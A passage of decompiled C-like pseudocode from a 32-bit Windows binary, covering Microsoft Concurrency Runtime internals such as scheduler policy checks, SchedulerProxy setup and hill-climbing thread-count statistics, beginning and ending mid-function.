  return *(_DWORD *)(*this + 4 * a2);
}

//----- (0043A2DE) --------------------------------------------------------
bool __cdecl sub_43A2DE(unsigned int a1, unsigned int a2)
{
  return a2 == -1 || a1 == -1 || a2 >= a1;
}

//----- (0043A2FC) --------------------------------------------------------
_DWORD *__thiscall sub_43A2FC(_DWORD *this, unsigned int a2, int *a3)
{
  void *v4; // eax
  unsigned int v5; // ebx
  _DWORD *v6; // edi
  unsigned int v7; // esi
  int v8; // eax
  int v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v13; // eax
  _ThrowInfo *v14; // [esp-4h] [ebp-54h]
  char v15[12]; // [esp+10h] [ebp-40h] BYREF
  char pExceptionObject[12]; // [esp+1Ch] [ebp-34h] BYREF
  char v17[12]; // [esp+28h] [ebp-28h] BYREF
  void *v18; // [esp+34h] [ebp-1Ch]
  int v19; // [esp+38h] [ebp-18h]
  void *Block; // [esp+3Ch] [ebp-14h]
  int v21; // [esp+4Ch] [ebp-4h]

  v18 = this;
  v4 = operator new(0x28u);
  *this = v4;
  Block = v4;
  v5 = 0;
  qmemcpy(v4, &unk_471198, 0x28u);
  v21 = 0;
  v6 = v4;
  while ( v5 < a2 )
  {
    *a3 += 4;
    v7 = *(_DWORD *)(*a3 - 4);
    v8 = *a3 + 4;
    *a3 = v8;
    v9 = *(_DWORD *)(v8 - 4);
    v19 = v9;
    if ( v7 > 9 )
    {
      v10 = sub_43A42D(v7);
      sub_4305F4((std::exception *)pExceptionObject, v10);
      v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__;
      v11 = pExceptionObject;
      goto LABEL_11;
    }
    if ( !sub_43A444(v7, v9) )
    {
      v13 = sub_43A42D(v7);
      sub_430620((std::exception *)v17, v13);
      v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__;
      v11 = v17;
LABEL_11:
      _CxxThrowException(v11, v14);
    }
    ++v5;
    v6[v7] = v19;
  }
  if ( !sub_43A2DE(*(_DWORD *)(*(_DWORD *)v18 + 8), *(_DWORD *)(*(_DWORD *)v18 + 4)) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v15);
    v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;
    v11 = v15;
    goto LABEL_11;
  }
  return sub_43A3E5(v18);
}
// 489620: using guessed type __TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;

//----- (0043A3E5) --------------------------------------------------------
_DWORD *__thiscall sub_43A3E5(void *this)
{
  unsigned int v2; // edx
  _DWORD *result; // eax
  unsigned int v4; // esi
  unsigned int v5; // ecx

  **(_DWORD **)this = 0;
  v2 = sub_43268F();
  result = *(_DWORD **)this;
  v4 = *(_DWORD *)(*(_DWORD *)this + 8);
  if ( v4 == -1 )
  {
    v5 = result[1];
    if ( v5 == -1 )
    {
      result[1] = v2;
      result = *(_DWORD **)this;
      *(_DWORD *)(*(_DWORD *)this + 8) = v2;
    }
    else
    {
      if ( v5 >= v2 )
        v5 = v2;
      result[2] = v5;
    }
  }
  else if ( result[1] == -1 )
  {
    if ( v4 <= v2 )
      v4 = v2;
    result[1] = v4;
  }
  return result;
}

//----- (0043A42D) --------------------------------------------------------
char *__cdecl sub_43A42D(unsigned int a1)
{
  int v1; // eax

  v1 = a1;
  if ( a1 > 0xA )
    v1 = 10;
  return off_4711C0[v1];
}
// 4711C0: using guessed type char *off_4711C0[11];

//----- (0043A444) --------------------------------------------------------
bool __cdecl sub_43A444(int a1, int a2)
{
  char v2; // cl
  bool v3; // zf

  v2 = 1;
  switch ( a1 )
  {
    case 0:
      return a2 == 0;
    case 1:
      if ( a2 > 0 )
        return v2;
      v3 = a2 == -1;
      break;
    case 2:
      if ( (unsigned int)a2 <= 0x7FFFFFFF )
        return v2;
      v3 = a2 == -1;
      break;
    case 3:
      if ( a2 <= 0 )
        return 0;
      return v2;
    case 4:
    case 5:
      return (unsigned int)a2 <= 0x7FFFFFFF;
    case 6:
      if ( a2 >= -7 && a2 < 7 || a2 == 15 || a2 == -15 )
        return v2;
      v3 = a2 == 61440;
      break;
    case 7:
      if ( !a2 )
        return v2;
      v3 = a2 == 1;
      break;
    case 8:
      if ( a2 == 1 )
        return v2;
      v3 = a2 == 0;
      break;
    case 9:
      if ( a2 )
        return a2 == 1;
      return v2;
    default:
      terminate(1);
  }
  if ( !v3 )
    return 0;
  return v2;
}
// 44E1AF: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (0043A524) --------------------------------------------------------
int __thiscall sub_43A524(int *this)
{
  int result; // eax
  char *v2; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = *this;
  if ( !*(_DWORD *)(*this + 8) )
  {
    v2 = sub_43A42D(2u);
LABEL_6:
    sub_430620((std::exception *)pExceptionObject, v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
  }
  if ( !*(_DWORD *)(result + 32) )
  {
    v2 = sub_43A42D(8u);
    goto LABEL_6;
  }
  return result;
}

//----- (0043A55E) --------------------------------------------------------
_DWORD *__thiscall sub_43A55E(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = a3[4];
  this[12] = 0;
  this[10] = a4;
  result = this;
  this[11] = (a3[3] << 8) + *(unsigned __int8 *)(a3[12] + 52 * a4 + 8);
  return result;
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0043A5BC) --------------------------------------------------------
_DWORD *__thiscall sub_43A5BC(_DWORD *this, int a2, _DWORD *a3)
{
  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[7] = 0;
  this[8] = 0;
  this[6] = a3;
  this[9] = a3[9];
  this[10] = a3[10];
  this[12] = 0;
  this[11] = a3[11];
  return this;
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0043A60A) --------------------------------------------------------
int __thiscall sub_43A60A(_DWORD *this)
{
  return sub_4310B3(*(_DWORD *)(this[5] + 12), this[9], this[10]);
}

//----- (0043A61C) --------------------------------------------------------
void __thiscall sub_43A61C(DWORD_PTR *Block)
{
  DWORD_PTR v3; // edi
  void *v4; // ecx
  HANDLE CurrentThread; // eax

  if ( Block[12]-- == 1 )
  {
    v3 = Block[7];
    sub_43A7B3((int)Block);
    v4 = (void *)Block[6];
    if ( v4 )
    {
      sub_43A61C(v4);
      sub_43BDB8((_DWORD *)Block[5], Block);
    }
    else
    {
      sub_43B582((_DWORD *)Block[5], Block[9], Block[10], v3 == 0);
      if ( !v3 )
      {
        CurrentThread = GetCurrentThread();
        sub_430B71(Block + 2, CurrentThread);
        sub_43B538((_DWORD *)Block[5], (int)Block);
        sub_43B616(Block[5], Block);
      }
    }
  }
}

//----- (0043A684) --------------------------------------------------------
int __thiscall sub_43A684(_DWORD *this)
{
  return this[11];
}

//----- (0043A688) --------------------------------------------------------
int __thiscall sub_43A688(_DWORD *this)
{
  return this[9];
}

//----- (0043A68C) --------------------------------------------------------
int __thiscall sub_43A68C(_DWORD *lpTlsValue)
{
  _DWORD *v1; // esi
  int v2; // ecx
  int result; // eax
  _DWORD *v4; // ecx
  int v5; // edi
  HANDLE CurrentThread; // ebx
  _DWORD *v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned __int16 v10; // cx
  int v11; // esi
  int v13[3]; // [esp+8h] [ebp-1Ch] BYREF
  int v14[3]; // [esp+14h] [ebp-10h] BYREF

  v1 = lpTlsValue;
  v2 = lpTlsValue[12];
  result = v2 + 1;
  lpTlsValue[12] = v2 + 1;
  if ( !v2 )
  {
    v4 = (_DWORD *)v1[5];
    v5 = v1[7];
    if ( v1[6] )
    {
      sub_43B1A9(v4, (int)v1);
    }
    else
    {
      sub_43BB69(v4, v1[9], v1[10], v5 == 0);
      if ( !v5 )
      {
        CurrentThread = GetCurrentThread();
        v7 = sub_4306CA(v13, (int)CurrentThread);
        v8 = 52 * v1[9];
        *((_WORD *)v1 + 6) = *((_WORD *)v7 + 2);
        v1[2] = *v7;
        v9 = *(_DWORD *)(v1[5] + 16);
        v10 = *(_WORD *)(v9 + v8 + 12);
        v11 = *(_DWORD *)(v9 + v8);
        v14[2] = 0;
        v14[1] = v10;
        v14[0] = v11;
        sub_430B71((DWORD_PTR *)v14, CurrentThread);
        v1 = lpTlsValue;
        sub_43BB1B((_DWORD *)lpTlsValue[5], (int)lpTlsValue);
        sub_43B122(v1[5], (int)v1);
      }
    }
    return sub_43A7CF(v1);
  }
  return result;
}
// 43A68C: using guessed type int var_1C[3];

//----- (0043A754) --------------------------------------------------------
void __thiscall sub_43A754(DWORD_PTR *this, int a2)
{
  _DWORD *v3; // ecx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( sub_43B75B((_DWORD *)this[5]) != this || (v3 = (_DWORD *)this[5], v3[2] != a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_433A80(v3[3], this);
}
// 488F48: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (0043A7B3) --------------------------------------------------------
BOOL __thiscall sub_43A7B3(int this)
{
  BOOL result; // eax

  result = sub_430192(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 20) + 12) + 112), *(LPVOID *)(this + 32));
  *(_DWORD *)(this + 32) = 0;
  return result;
}

//----- (0043A7CF) --------------------------------------------------------
BOOL __thiscall sub_43A7CF(_DWORD *lpTlsValue)
{
  DWORD v2; // esi

  v2 = *(_DWORD *)(*(_DWORD *)(lpTlsValue[5] + 12) + 112);
  lpTlsValue[8] = sub_430184(v2);
  return sub_430192(v2, lpTlsValue);
}

//----- (0043A7F2) --------------------------------------------------------
double __cdecl sub_43A7F2(double a1)
{
  if ( 0.0 == a1 )
    return 0.0;
  if ( a1 <= 0.0 )
    return (double)-1;
  else
    return (double)1;
}

//----- (0043A82A) --------------------------------------------------------
int __thiscall sub_43A82A(int this, int a2, unsigned int a3, int a4)
{
  int v4; // eax
  int v5; // edx
  int result; // eax

  v4 = this + 8;
  v5 = 64;
  do
  {
    *(double *)(v4 - 8) = 0.0;
    *(double *)v4 = 0.0;
    *(_DWORD *)(v4 + 8) = 0;
    *(_DWORD *)(v4 + 12) = 0;
    *(_DWORD *)(v4 + 16) = 0;
    v4 += 32;
    --v5;
  }
  while ( v5 );
  *(_DWORD *)(this + 2048) = a4;
  *(_DWORD *)(this + 2076) = a2;
  *(_DWORD *)(this + 2068) = 0;
  *(_DWORD *)(this + 2072) = 0;
  *(_DWORD *)(this + 2080) = 0;
  *(_DWORD *)(this + 2084) = 0;
  *(_DWORD *)(this + 2088) = 0;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2096) = 0;
  *(_BYTE *)(this + 2100) = 1;
  *(_DWORD *)(this + 2064) = a3;
  result = this;
  *(double *)(this + 2056) = (double)a3;
  return result;
}

//----- (0043A8B7) --------------------------------------------------------
int __thiscall sub_43A8B7(double *this, double a2, int a3)
{
  int result; // eax
  double v4; // st7

  result = a3;
  v4 = *this + a2;
  ++*((_DWORD *)this + 4);
  *((_DWORD *)this + 6) = a3;
  *this = v4;
  this[1] = a2 * a2 + this[1];
  return result;
}

//----- (0043A8DA) --------------------------------------------------------
double __stdcall sub_43A8DA(unsigned int a1, unsigned int a2, int a3, int a4)
{
  return (double)a2 * 10.0 / (double)a1;
}

//----- (0043A915) --------------------------------------------------------
double __thiscall sub_43A915(char *this, int a2, int a3)
{
  char *v4; // ebx
  char *v5; // esi
  long double v6; // st6
  long double v7; // st7
  double v9; // [esp+14h] [ebp-18h]
  double v10; // [esp+1Ch] [ebp-10h]

  v4 = sub_43AA92(this, a2);
  v5 = sub_43AA92(this, a3);
  v10 = sub_43AB06((double *)v4);
  v6 = sub_43AB06((double *)v5) - v10;
  v9 = sub_43AD58((double *)v4) / (double)*((int *)v4 + 4);
  v7 = 0.0;
  if ( fabs(v6) > 0.0 )
    v7 = fabs(sqrt(sub_43AD58((double *)v5) / (double)*((int *)v5 + 4) + v9) / v6);
  return exp(v7 * -1.0) * (v6 / v10 / ((double)(a3 - a2) / (double)a2) - 0.15);
}

//----- (0043A9D0) --------------------------------------------------------
double __thiscall sub_43A9D0(int this)
{
  long double v3; // [esp+Ch] [ebp-8h]

  v3 = sqrt(sub_43AD58((double *)this)) / sqrt((double)*(int *)(this + 16));
  return v3 / sub_43AB06((double *)this);
}

//----- (0043AA07) --------------------------------------------------------
unsigned int __thiscall sub_43AA07(int this, int a2)
{
  unsigned int result; // eax
  int v4; // ecx
  char *v5; // eax

  result = a2;
  v4 = *(_DWORD *)(this + 2068);
  if ( a2 != v4 )
  {
    *(_DWORD *)(this + 2072) = v4;
    *(_DWORD *)(this + 2068) = a2;
    v5 = sub_43AA92((char *)this, a2);
    *(double *)v5 = 0.0;
    *((_DWORD *)v5 + 4) = 0;
    *((_DWORD *)v5 + 5) = 0;
    *((_DWORD *)v5 + 6) = 0;
    *((double *)v5 + 1) = 0.0;
    return sub_43AA4C((unsigned int *)this);
  }
  return result;
}

//----- (0043AA4C) --------------------------------------------------------
unsigned int __thiscall sub_43AA4C(unsigned int *this)
{
  unsigned int *v1; // edx
  int v2; // esi
  unsigned int result; // eax

  v1 = this + 5;
  v2 = 64;
  do
  {
    result = *v1;
    if ( *v1 != this[517] && result != this[518] )
    {
      result = this[521] - v1[1];
      if ( result > 0x32 )
      {
        *(v1 - 1) = 0;
        *v1 = 0;
        v1[1] = 0;
        *(double *)(v1 - 5) = 0.0;
        *(double *)(v1 - 3) = 0.0;
      }
    }
    v1 += 8;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (0043AA92) --------------------------------------------------------
char *__thiscall sub_43AA92(char *this, int a2)
{
  char *result; // eax

  result = &this[32 * (a2 & 0x3F)];
  if ( *((_DWORD *)result + 5) != a2 )
  {
    *((_DWORD *)result + 4) = 0;
    *((_DWORD *)result + 6) = 0;
    *(double *)result = 0.0;
    *((double *)result + 1) = 0.0;
    *((_DWORD *)result + 5) = a2;
  }
  return result;
}

//----- (0043AABD) --------------------------------------------------------
BOOL __thiscall sub_43AABD(_BYTE *this)
{
  char v1; // dl

  v1 = this[2100];
  this[2100] = v1 == 0;
  return v1 != 0;
}

//----- (0043AAD6) --------------------------------------------------------
bool __stdcall sub_43AAD6(int a1)
{
  return *(_DWORD *)(a1 + 16) > 5u || *(_DWORD *)(a1 + 16) >= 3u && fabs(sub_43A9D0(a1)) <= 0.004;
}

//----- (0043AB06) --------------------------------------------------------
double __thiscall sub_43AB06(double *this)
{
  int v2; // [esp+4h] [ebp-4h]

  v2 = *((_DWORD *)this + 4);
  if ( v2 )
    return *this / (double)v2;
  else
    return 0.0;
}

//----- (0043AB26) --------------------------------------------------------
unsigned int __thiscall sub_43AB26(_DWORD *this, unsigned int a2)
{
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int result; // eax

  v3 = (_DWORD *)this[512];
  v4 = v3[46] + sub_432E07(v3);
  v5 = sub_431117(v3);
  v6 = this[517];
  v7 = v5;
  v8 = this[516];
  result = a2;
  if ( v8 + v6 < a2 )
    result = v8 + v6;
  if ( v6 > v8 && v6 - v8 > result )
    result = v6 - v8;
  if ( result == v6 )
  {
    if ( result <= v4 )
      ++result;
    else
      --result;
  }
  if ( v4 > result )
    result = v4;
  if ( v7 < result )
    return v7;
  return result;
}

//----- (0043AB98) --------------------------------------------------------
unsigned int __thiscall sub_43AB98(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  unsigned int result; // eax
  int v7; // edi
  unsigned int v8; // ecx
  int v9; // edx
  unsigned int v10; // eax
  int v11; // esi
  _DWORD *v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // eax
  unsigned int v15; // esi
  int v16; // edi
  double *v17; // esi
  double v18; // st7
  unsigned __int64 v19; // rax
  double v20; // [esp+18h] [ebp-Ch]
  double v21; // [esp+18h] [ebp-Ch]
  char *v22; // [esp+20h] [ebp-4h]

  if ( !a2 )
    return 0;
  ++*(_DWORD *)(this + 2084);
  sub_43AA07(this, a2);
  v7 = *(_DWORD *)(this + 2088);
  v8 = a3;
  v9 = a4;
  if ( v7 )
  {
    v8 = *(_DWORD *)(this + 2092) + a3;
    v9 = *(_DWORD *)(this + 2096) + a4;
  }
  if ( v8 < a2 && v8 < a5 )
  {
    v10 = a2 - v8;
    v8 = a2;
    v9 += v10;
  }
  v11 = *(_DWORD *)(this + 2080);
  if ( !v11 || v8 || v9 || a5 )
  {
    v14 = v7 + 1;
    v15 = v11 + 1;
    *(_DWORD *)(this + 2080) = v15;
    *(_DWORD *)(this + 2092) = 0;
    *(_DWORD *)(this + 2096) = 0;
    *(_DWORD *)(this + 2088) = 0;
    v16 = *(_DWORD *)(this + 2068);
    v20 = sub_43A8DA(v14, v8, v9, a5);
    if ( v15 <= 1 )
    {
      *(_DWORD *)(this + 2072) = v16;
      return v16;
    }
    v17 = (double *)sub_43AA92((char *)this, v16);
    v22 = sub_43AA92((char *)this, *(_DWORD *)(this + 2072));
    sub_43A8B7(v17, v20, *(_DWORD *)(this + 2084));
    if ( !*((_DWORD *)v22 + 4) || v17 == (double *)v22 )
    {
      if ( !sub_43AAD6((int)v17) )
        return v16;
      LODWORD(v19) = *(_DWORD *)(this + 2068) + sub_43AABD((_BYTE *)this);
    }
    else
    {
      if ( !sub_43AAD6((int)v17) )
        return v16;
      v18 = sub_43A915((char *)this, *(_DWORD *)(this + 2072), *(_DWORD *)(this + 2068)) * *(double *)(this + 2056);
      v21 = (double)*(unsigned int *)(this + 2068);
      v19 = (unsigned __int64)(v21 + v18);
      if ( (_DWORD)v19 == *(_DWORD *)(this + 2068) )
        v19 = (unsigned __int64)(sub_43A7F2(v18) + v21);
    }
    return sub_43AB26((_DWORD *)this, v19);
  }
  v12 = *(_DWORD **)(this + 2048);
  v13 = v7 + 1;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2088) = v13;
  *(_DWORD *)(this + 2096) = 0;
  result = v12[46] + sub_432E07(v12);
  if ( v13 < 3 )
    return *(_DWORD *)(this + 2068);
  return result;
}

//----- (0043AD58) --------------------------------------------------------
double __thiscall sub_43AD58(double *this)
{
  int v1; // eax
  double result; // st7
  long double v3; // st6

  v1 = *((_DWORD *)this + 4);
  result = 0.0;
  v3 = 0.0;
  if ( v1 >= 2 )
    v3 = (this[1] - *this * *this / (double)v1) / (double)(v1 - 1);
  if ( fabs(v3) > 0.0001 )
    return v3;
  return result;
}

//----- (0043ADA4) --------------------------------------------------------
char *__thiscall sub_43ADA4(char *this, int a2, int a3, _DWORD *a4)
{
  int v5; // eax
  bool v6; // zf
  HANDLE CurrentThread; // eax
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // esi
  unsigned int v11; // edi
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // eax
  int v17; // ecx
  int v18; // esi
  unsigned int v19; // ecx
  void *v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  unsigned int v24; // ecx
  unsigned int v26; // [esp+14h] [ebp-18h]

  *((_DWORD *)this + 1) = 0;
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  *((_DWORD *)this + 3) = a3;
  sub_42E44D((LPCRITICAL_SECTION)(this + 32));
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 39) = 0;
  *((_DWORD *)this + 40) = 0;
  *((_DWORD *)this + 42) = 0;
  *((_DWORD *)this + 43) = 0;
  *((_DWORD *)this + 44) = 0;
  *((_DWORD *)this + 45) = 0;
  *((_DWORD *)this + 46) = 0;
  *((_DWORD *)this + 49) = 0;
  *((_DWORD *)this + 50) = 0;
  *((_DWORD *)this + 2) = a2;
  *((_DWORD *)this + 35) = sub_43A2A8(a4, 1u);
  *((_DWORD *)this + 34) = sub_43A2A8(a4, 2u);
  *((_DWORD *)this + 36) = sub_43A2A8(a4, 3u);
  *((_DWORD *)this + 37) = sub_43A2A8(a4, 5u);
  *((_DWORD *)this + 38) = sub_43A2A8(a4, 6u);
  v5 = sub_43A2A8(a4, 8u);
  v6 = *((_DWORD *)this + 38) == 61440;
  this[204] = v5 == 1;
  if ( v6 )
  {
    CurrentThread = GetCurrentThread();
    *((_DWORD *)this + 38) = (char)sub_430010(CurrentThread);
  }
  *((_DWORD *)this + 31) = (***((int (__thiscall ****)(_DWORD))this + 2))(*((_DWORD *)this + 2));
  v8 = sub_43245D();
  v9 = *((_DWORD *)this + 35);
  v10 = v8;
  v11 = *((_DWORD *)this + 36);
  v26 = v8;
  *((_DWORD *)this + 47) = v8;
  v12 = (v8 + v9 - 1) / v8;
  if ( v11 >= v12 )
    v10 = (v9 + v11 - 1) / v11;
  else
    *((_DWORD *)this + 36) = v12;
  *((_DWORD *)this + 32) = v10;
  v13 = *((_DWORD *)this + 34);
  v14 = v9 / v10;
  if ( v9 % v10 )
  {
    v16 = (v10 + v9 - 1) / v10;
    *((_DWORD *)this + 36) = v16;
    v17 = v9 + v10 * (1 - v16);
    v18 = v10 - v17;
    *((_DWORD *)this + 41) = v17;
    v19 = v18 * (v16 - 1);
    if ( v19 < v13 )
    {
      *((_DWORD *)this + 33) = v18;
      v15 = v18 + (v13 - v19 + v16 - 1) / v16;
    }
    else
    {
      v15 = (v13 + v16 - 2) / (v16 - 1);
    }
  }
  else
  {
    *((_DWORD *)this + 36) = v14;
    *((_DWORD *)this + 41) = v10;
    v15 = (v13 + v14 - 1) / (v9 / v10);
  }
  *((_DWORD *)this + 33) = v15;
  sub_433812(*((volatile signed __int32 **)this + 3));
  if ( this[204] )
  {
    v20 = operator new(0x838u);
    if ( v20 )
      v21 = sub_43A82A((int)v20, *((_DWORD *)this + 31), v26, (int)this);
    else
      v21 = 0;
    *((_DWORD *)this + 14) = v21;
  }
  v22 = sub_432694();
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 48) = v22;
  v23 = unknown_libname_45((unsigned __int64)(unsigned int)v22 >> 30 != 0 ? -1 : 4 * v22);
  v24 = 0;
  for ( *((_DWORD *)this + 5) = v23; v24 < *((_DWORD *)this + 48); ++v24 )
    *(_DWORD *)(*((_DWORD *)this + 5) + 4 * v24) = v24;
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 432694: using guessed type int sub_432694(void);
// 471304: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (0043AFFA) --------------------------------------------------------
void __thiscall sub_43AFFA(char *this)
{
  _DWORD *v2; // ecx
  void **v3; // [esp-4h] [ebp-18h]

  v3 = (void **)*((_DWORD *)this + 4);
  v2 = (_DWORD *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  sub_431130(v2, v3);
  j_j_j___free_base(*((void **)this + 5));
  sub_433860(*((_DWORD *)this + 3));
  sub_42E4D7((LPCRITICAL_SECTION)(this + 32));
}
// 471304: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (0043B057) --------------------------------------------------------
void __thiscall sub_43B057(_DWORD *this, int a2, int a3, char a4)
{
  int v5; // eax
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  char *v8; // esi
  int v9; // eax
  int v10; // ecx
  char v11; // [esp+Ch] [ebp-Ch] BYREF
  int v12; // [esp+10h] [ebp-8h]
  char *v13; // [esp+14h] [ebp-4h]

  v5 = this[41];
  v6 = this[36];
  if ( v5 )
    this[41] = v5 - 1;
  else
    --v6;
  ++*(_DWORD *)(a2 + 28);
  ++this[40];
  v7 = (_DWORD *)(*(_DWORD *)(a2 + 48) + 52 * a3);
  *v7 = 4;
  v7[9] = v6;
  this[44] += v6;
  if ( a4 )
    sub_43BED9(this, a2, a3);
  if ( v6 == 1 )
  {
    v13 = &v11;
    goto LABEL_9;
  }
  v8 = (char *)unknown_libname_45((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  v13 = v8;
  if ( v6 )
  {
LABEL_9:
    v12 = 0;
    do
    {
      v9 = (*(int (__thiscall **)(_DWORD *, int, int))(*this + 24))(this, a2, a3);
      v10 = v12;
      v8 = v13;
      *(_DWORD *)&v13[4 * v12] = v9;
      v12 = v10 + 1;
    }
    while ( v10 + 1 < v6 );
  }
  sub_43B1B8((int)this, (int)v8, v6);
  if ( v8 != &v11 )
    j_j_j___free_base(v8);
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043B122) --------------------------------------------------------
void __thiscall sub_43B122(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v2; // esi

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  sub_43B170(
    (_DWORD *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + *(_DWORD *)(this + 16) + 48) + 52 * *(_DWORD *)(a2 + 40) + 12),
    a2);
  sub_42E8A1(v2);
}

//----- (0043B170) --------------------------------------------------------
int __thiscall sub_43B170(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 56) = *(_DWORD *)(result + 56);
    *(_DWORD *)(a2 + 52) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 56) + 52) = a2;
    result = this[1];
    *(_DWORD *)(result + 56) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 56) = a2;
    *(_DWORD *)(a2 + 52) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (0043B1A9) --------------------------------------------------------
int __thiscall sub_43B1A9(_DWORD *this, int a2)
{
  return sub_43B170(this + 49, a2);
}

//----- (0043B1B8) --------------------------------------------------------
void __thiscall sub_43B1B8(int this, int a2, unsigned int a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // eax
  int v5; // ebx
  int v6; // eax
  struct _RTL_CRITICAL_SECTION *v7; // [esp+10h] [ebp-18h]
  unsigned int v8; // [esp+14h] [ebp-14h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v7 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  v4 = 0;
  v8 = 0;
  if ( a3 )
  {
    do
    {
      v5 = *(_DWORD *)(a2 + 4 * v4);
      v6 = (**(int (__thiscall ***)(int))v5)(v5);
      sub_43B170(
        (_DWORD *)(*(_DWORD *)(52 * v6 + *(_DWORD *)(this + 16) + 48) + 12 + 52 * *(_DWORD *)(v5 + 48)),
        v5 + 8);
      v4 = v8 + 1;
      v8 = v4;
    }
    while ( v4 < a3 );
    v3 = v7;
  }
  (*(void (__thiscall **)(_DWORD, int, unsigned int))(**(_DWORD **)(this + 8) + 12))(*(_DWORD *)(this + 8), a2, a3);
  *(_DWORD *)(this + 156) += a3;
  sub_42E8A1(v3);
}

//----- (0043B266) --------------------------------------------------------
unsigned int __thiscall sub_43B266(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // esi
  int v7; // ebx
  unsigned __int64 v8; // rax
  unsigned int v9; // esi

  v3 = 0;
  v4 = this[35];
  v5 = this[39];
  if ( v4 > v5 )
  {
    v6 = this[36];
    v7 = this[41];
    v8 = v4 - v5;
    if ( v7 * v6 < (unsigned int)v8 )
    {
      LODWORD(v8) = v8 - v7 * v6;
      v3 = v7 + v8 / (v6 - 1);
    }
    else
    {
      v3 = (unsigned int)v8 / v6;
    }
  }
  v9 = v3 + this[40];
  if ( v9 >= sub_431117(this) )
    v9 = sub_431117(this);
  if ( v9 >= a2 )
    return a2;
  return v9;
}

//----- (0043B2D6) --------------------------------------------------------
int __thiscall sub_43B2D6(void *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  result = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !result )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a2);
  return result;
}

//----- (0043B332) --------------------------------------------------------
void __thiscall sub_43B332(_DWORD *this)
{
  _DWORD *v1; // eax
  unsigned int v2; // edx
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // ecx
  int v6; // edx
  int v7; // ebx
  int v8; // ebx
  int v9; // edi
  int v10; // edi
  int v12; // [esp+4h] [ebp-14h]
  unsigned int v13; // [esp+8h] [ebp-10h]
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  int v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]

